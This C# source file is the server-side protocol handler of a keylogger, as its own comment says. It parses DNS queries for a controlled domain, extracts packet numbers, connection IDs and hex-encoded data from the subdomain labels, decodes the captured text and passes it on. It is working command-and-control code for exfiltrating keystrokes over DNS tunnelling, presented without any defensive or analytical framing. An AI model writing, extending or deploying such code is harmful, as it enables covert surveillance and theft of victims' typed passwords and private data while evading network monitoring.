using System.Text;
using Server.Models;

namespace Server.Logic
{
    /// <summary>
    /// Handle keylogger protocol (a/b packets)
    /// </summary>
    public class ProtocolHandler
    {
        private readonly string _domain;

        public event Action<int, string>? OnDataReceived;

        public ProtocolHandler(string domain)
        {
            _domain = domain;
        }

        /// <summary>
        /// Extract subdomain data from full query
        /// </summary>
        public string GetData(string full)
        {
            string stripped = full.TrimEnd('.');

            // Check if query belongs to our domain
            if (!(stripped == _domain || stripped.EndsWith("." + _domain)))
            {
                throw new ShortCircuitException();
            }

            // Count dots - must match format: type.x.x.x.domain
            int expectedDots = _domain.Count(c => c == '.') + 4;
            int actualDots = stripped.Count(c => c == '.');

            if (actualDots != expectedDots)
            {
                throw new UnrelatedException();
            }

            // Return subdomain part (a.1.1.1 or b.0.5.hexdata)
            return full.Substring(0, IndexOfSecondDot(stripped));
        }
        
        /// Parse data packet and add to parser
        /// Format: packetNumber.connectionId.hexData

        public (int PacketNumber, int ConnectionId) ParseDataPacket(string data, ClientManager clientManager)
        {
            // Format validation
            if (data.Count(c => c == '.') != 2)
            {
                throw new DNSSyntaxException();
            }

            string[] parts = data.Split('.');
            int packetNumber = int.Parse(parts[0]);
            int connectionId = int.Parse(parts[1]);
            string hexData = parts[2];
            
            if (!clientManager.ConnectionExists(connectionId))
            {
                throw new NXConnectionException();
            }
            
            if (hexData.Length % 2 != 0)
            {
                throw new DNSSyntaxException();
            }
            
            var parser = clientManager.GetParser(connectionId);
            if (parser == null)
            {
                throw new NXConnectionException();
            }

            byte[] decodedData = Convert.FromHexString(hexData);
            string decodedText = Encoding.ASCII.GetString(decodedData);

            try
            {
                parser.AddData(packetNumber, decodedData);
                OnDataReceived?.Invoke(connectionId, decodedText);
            }
            catch (DuplicatePacketException)
            {
                throw new ShortCircuitException();
            }

            return (packetNumber, connectionId);
        }
        
        /// Find position of second dot from right

        private int IndexOfSecondDot(string str)
        {
            int index = 0;
            int last = 0;

            for (int i = 0; i < str.Length; i++)
            {
                if (str[i] == '.')
                {
                    index = last;
                    last = i;
                }
            }

            return index > 0 ? index : last;
        }
    }
}
